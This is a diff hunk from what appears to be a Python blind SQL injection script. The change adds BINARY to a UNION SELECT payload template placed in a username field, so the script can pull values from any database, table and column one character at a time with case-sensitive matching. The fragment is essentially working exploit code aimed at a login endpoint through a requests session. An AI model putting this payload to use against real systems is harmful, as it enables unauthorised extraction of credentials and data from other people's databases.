@@ -43,7 +43,7 @@ CHAR_ORD_RANGE = list(range(32, 127))  # change to range(0,256) if you need full
 # where next_len = length(prefix) + 1
 USERNAME_TEMPLATE = (
     "a' UNION SELECT 1,2,3,4 WHERE "
-    "LEFT((SELECT {col} FROM `{db}`.`{table}` LIMIT {idx},1), {next_len}) = CONCAT('{prefix}', CHAR({ord}));-- -"
+    "BINARY LEFT((SELECT {col} FROM `{db}`.`{table}` LIMIT {idx},1), {next_len}) = CONCAT('{prefix}', CHAR({ord}));-- -"
 )
 
 session = requests.Session()
